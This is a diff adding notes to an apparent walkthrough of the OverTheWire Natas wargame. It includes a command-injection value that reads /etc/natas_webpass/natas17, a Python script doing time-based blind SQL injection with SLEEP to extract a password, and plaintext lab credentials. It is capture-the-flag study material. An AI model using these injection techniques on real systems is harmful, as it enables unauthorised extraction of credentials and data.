@@ -267,3 +267,38 @@ anything$(grep ^b /etc/natas_webpass/natas17)
 // If grep returns true, we have match and can append each of the letter found in a variable called password
 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 
+lvl 17 --> lvl 18
+http://natas17.natas.labs.overthewire.org/
+natas17
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+// The point of this level is to realise a SQL Injection.
+// The difficulty is that we cant have any idea of the results of our queries
+ if(mysql_num_rows($res) > 0) { 
+        //echo "This user exists.<br>"; 
+    } else { 
+        //echo "This user doesn't exist.<br>"; 
+    } 
+    } else { 
+        //echo "Error in query.<br>"; 
+    } 
+// We will use SLEEP as a way to mesure the time needed if we get an anwser, we will compare the time for the right and wrong answer to come back and construct our password as such
+//
+while ( len(seen_password) < 32 ):
+
+	for character in characters:
+		start_time = time()
+
+		print("trying", "".join(seen_password) + character)
+		response = session.post(url, data = {"username": 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + character +  '%" AND SLEEP(1) # '}, auth = (username, password) )
+        content = response.text
+		end_time = time()
+		difference = end_time - start_time
+		
+
+		if ( difference > 1 ):
+			# success, correct character!
+			seen_password.append(character)
+			break
+        print(content)
+//
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
